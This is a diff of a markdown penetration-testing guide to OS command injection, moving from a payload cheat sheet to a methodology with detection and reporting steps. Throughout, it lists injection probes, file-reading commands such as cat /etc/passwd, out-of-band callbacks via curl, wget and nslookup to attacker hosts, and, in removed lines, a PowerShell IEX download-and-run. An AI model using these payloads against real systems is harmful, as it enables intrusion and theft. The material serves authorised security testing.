@@ -1,164 +1,183 @@
 # Command Injection
 
-# Exploitation
+## Why It Matters
 
-## Basic Command Chaining
-```
-; ls -la
+Command injection can move a web finding straight into operating system access. In practice the path is usually:
+
+- identify an input that influences a shell command
+- prove command execution
+- determine whether output is visible, blind, or out-of-band
+- escalate to file read, persistence, or a shell only if needed
+
+## Recognition Cues
+
+Look for inputs used by:
+
+- ping or traceroute tools
+- DNS lookup features
+- image processing wrappers
+- archive handling
+- PDF or office conversion
+- backup, export, and diagnostic functions
+
+Strong hints:
+
+- shell syntax errors in responses
+- unusual delays after `sleep`
+- output from commands appearing in the response
+
+## Workflow
+
+1. identify the parameter likely reaching a shell command
+2. determine the operating system and command context
+3. test simple separators and substitutions
+4. decide whether the issue is reflected, blind, or out-of-band
+5. prove impact with the least noisy technique
+
+## Step 1: Initial Syntax Tests
+
+Common probes:
+
+```text
+;id
+&& id
+| id
+`id`
+$(id)
 ```
 
-## Using logic operators
-```
-&& ls -la
+Use Windows variants when appropriate:
+
+```text
+& whoami
+&& whoami
+| whoami
 ```
 
-## Commenting out the rest of a command
-```
-; ls -la #
-```
+You are trying to learn:
 
-## Using a pipe for command chaining
-```
-| ls -la
-```
+- which metacharacters survive
+- whether the app is on Linux or Windows
+- whether output returns in-band
 
-## Testing for blind injection
-```
+## Step 2: Blind Detection
+
+If output is not reflected, use timing:
+
+```text
 ; sleep 10
 ; ping -c 10 127.0.0.1
-& whoami > /var/www/html/whoami.txt &
+& timeout 10
+& ping -n 10 127.0.0.1
 ```
 
-## Out-of-band testing
-```
-& nslookup webhook.site/<id>?`whoami` &
+If the response delay changes reliably, you likely have blind command execution.
+
+## Step 3: Out-Of-Band Detection
+
+If timing is unclear, try DNS or HTTP callbacks:
+
+```text
+nslookup uniquestring.attackerdomain.com
+wget http://attacker.com/uniquestring
+curl http://attacker.com/uniquestring
 ```
 
-## Command Separator Tests
+This is especially useful when:
 
-### Semicolon (;) - Command sequencing
-```
-command1;command2        # Executes commands sequentially
-ping 127.0.0.1;id       # Executes ping, then id
-echo test;whoami        # Outputs test, then username
-```
-### Ampersand (&) - Background processing
-```
-command1&command2       # Executes both commands in background
-ping 127.0.0.1&dir     # Starts ping and immediately runs dir
-whoami&hostname        # Runs both commands simultaneously
-```
-### Double Ampersand (&&) - Conditional execution
-```
-command1&&command2      # Executes command2 only if command1 succeeds
-ping 127.0.0.1&&whoami # Runs whoami only if ping succeeds
-cd /tmp&&ls -la        # Lists directory only if cd succeeds
-```
-### Pipe (|) - Output redirection
-```
-command1|command2      # Sends output of command1 to command2
-whoami|tr a-z A-Z     # Converts username to uppercase
-ls -la|grep root      # Lists files and filters for 'root'
+- the app suppresses output
+- command results are not visible
+- time-based testing is noisy
+
+## Step 4: OS And Context Discovery
+
+Use small probes:
+
+### Linux
+
+```text
+uname -a
+cat /etc/issue
+id
+whoami
 ```
 
+### Windows
 
-## Command Substitution Tests
-
-### Backtick (`) substitution
-```
-`command`             # Classic command substitution
-echo `whoami`        # Outputs result of whoami
-ping `hostname`      # Pings the result of hostname
-```
-
-### Dollar substitution
-```
-$(command)           # Modern command substitution
-echo $(id)          # Outputs result of id
-cat $(locate passwd) # Reads files found by locate
+```text
+ver
+whoami
+hostname
+type C:\Windows\System32\drivers\etc\hosts
 ```
 
-### Nested substitution
-```
-$(echo `whoami`)    # Nested classic in modern
-`echo $(hostname)`  # Nested modern in classic
-``` 
+The goal is to confirm execution, not to spray large payloads.
 
-## Newline Injection Tests
-### URL encoded newlines
-```
-command1%0acommand2  # %0a represents \n
-ping%0aid           # Executes ping, then id on new line
-whoami%0als         # Runs whoami, then ls
+## Useful Injection Styles
+
+### Separators
+
+```text
+; command
+&& command
+| command
 ```
 
-### Carriage return injection
-```
-command1%0dcommand2  # %0d represents \r
-echo test%0dcat /etc/passwd  # Potentially bypasses filters
+### Substitution
+
+```text
+`command`
+$(command)
 ```
 
-## OS Detection Tests
-### Windows specific commands
-```
-ver                  # Shows Windows version
-systeminfo          # Detailed system information
-type C:\Windows\System32\drivers\etc\hosts  # Reads hosts file
-net user            # Lists users
-dir C:\             # Lists root directory
-```
-### Linux specific commands
-```
-uname -a            # Kernel and system information
-cat /etc/issue      # Distribution information
-cat /proc/version   # Kernel version information
-lsb_release -a      # Distribution details
-cat /etc/passwd     # User account information
+### Newlines
+
+```text
+%0acommand
+%0dcommand
 ```
 
-## Out-of-Band Tests
+Different filters fail in different ways, so test more than one style.
 
-### DNS based detection
-```
-nslookup uniquestring.attackerdomain.com  # Generates DNS lookup
-ping uniquestring.attackerdomain.com      # ICMP based detection
-dig uniquestring.attackerdomain.com       # DNS query tool
-```
+## Escalation Paths
 
-### HTTP based detection
-```
-wget http://attacker.com/uniquestring     # Generates HTTP GET
-curl http://attacker.com/uniquestring     # Alternative HTTP request
-powershell IEX(New-Object Net.WebClient).downloadString('http://attacker.com') # PowerShell web request
-```
+Once you confirm execution, typical next steps are:
 
-## Time-based Tests
-### Linux Delay Commands
-```
-ping -c 10 127.0.0.1    # 10 second delay using ping
-sleep 10               # Direct delay command
-perl -e "sleep 10"     # Perl based delay
-python -c "import time; time.sleep(10)"  # Python delay
+- read files
+- write a proof file
+- run a short one-shot command
+- move to a reverse shell only if required
+
+Example proof:
+
+```text
+; whoami > /var/www/html/whoami.txt
 ```
 
-### Windows Delay Commands
-```
-ping -n 10 127.0.0.1   # Windows ping delay
-timeout 10             # Windows timeout command
-Start-Sleep -s 10      # PowerShell sleep
-```
+## Pitfalls
 
-## Automated Discovery
+- assuming Linux payloads on a Windows host
+- jumping to a reverse shell before confirming basic execution
+- misreading application latency as time-based execution
+- forgetting that some payloads land inside quoted arguments
 
-### Using Nuclei
+## Reporting Notes
 
-```
-# Run command injection templates
-nuclei -u http://target.com -t cmd-injection/
+Capture:
 
-# Run with custom templates
-nuclei -u http://target.com -t custom-cmd.yaml
+- the vulnerable parameter
+- the payload class that worked
+- whether the issue was reflected, blind, or out-of-band
+- the user context gained
+- what system access or file access was demonstrated
 
-# Severity based scanning
-nuclei -u http://target.com -t cmd-injection/ -severity critical,high
+## Fast Checklist
+
+```text
+1. Find a shell-reaching input
+2. Test separators and substitution
+3. Confirm reflected, blind, or OOB behavior
+4. Identify OS context
+5. Prove minimal impact
+6. Save payload, response, and host-level evidence
 ```
